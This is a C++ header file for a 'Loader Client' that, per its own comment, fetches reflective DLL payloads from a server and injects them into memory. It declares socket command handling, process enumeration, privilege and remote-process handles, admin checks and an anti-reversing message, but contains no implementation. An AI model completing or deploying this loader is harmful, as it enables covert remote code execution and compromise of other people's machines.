#define NOMINMAX

#ifndef LOADER_DLL
#define LOADER_DLL

/*
* The Loader Client
* The loader loads 'reflective dll' payloads from server and runs them in memory using reflective dll injection.
*/

#include "../common/LoadLibraryR.h"
#include <stdio.h>
#include <winsock2.h>
#include <WS2tcpip.h>
#include <Windows.h>
#include <psapi.h>
#include <fstream>
#include <string>
#include <sstream>
#include <TlHelp32.h>
#include <wininet.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")

#define BUFFER 4096
#define NTSTATUS LONG
#define UNLEN 256

#define CLIENT_TYPE "ZGxsLWxvYWRlcg==" // base64 for dll-loader
#define MSG "Oh no! Looks like I'm being reversed!"


#define BREAK_WITH_ERROR( e ) { sockprintf( "F_ERR%s. Error=%ld", e, GetLastError() ); break; }

static bool connected = FALSE;

/* LoadInfo.cpp */
void split(char* src, char* dest[5], const char* delimeter);
std::string GetServerInfo();
std::string getLastLine(std::ifstream& in);
std::istream& ignoreline(std::ifstream& in, std::ifstream::pos_type& pos);
std::string MyLocation();

// OOP
class DLL_Loader {
private:
	SOCKET sockfd;
	struct sockaddr_in server;
	char recvbuf[BUFFER] = { 0 };
	TOKEN_PRIVILEGES priv = { 0 };
	HANDLE hModule = NULL;
	HANDLE hProcess = NULL;
	HANDLE hToken = NULL;
	LPVOID lpRemoteCommandLine = NULL;

	int fsize = 0;
	int expected = 0;
	char* fileinfo[3];
	char temp[BUFFER];
	unsigned char* DLL;
	DWORD dwProcessId;

public:
	void ProbeConnect();
	void ExecSock(SOCKET sockfd, char recvbuf[BUFFER]);
	void REConnect();
	void LoaderMain();
	void sockprintf(const char* words, ...);
	void sockSend(const char* data);
	DWORD ProcessId(LPCTSTR ProcessName);
	void SendProcessList();
	BOOL IsAdmin();
	std::string ProcessNameAndID(DWORD processID);
	// DWORD WINAPI ReflectiveDLLInject(LPVOID lpParameter);
	void OS(void);
};


#endif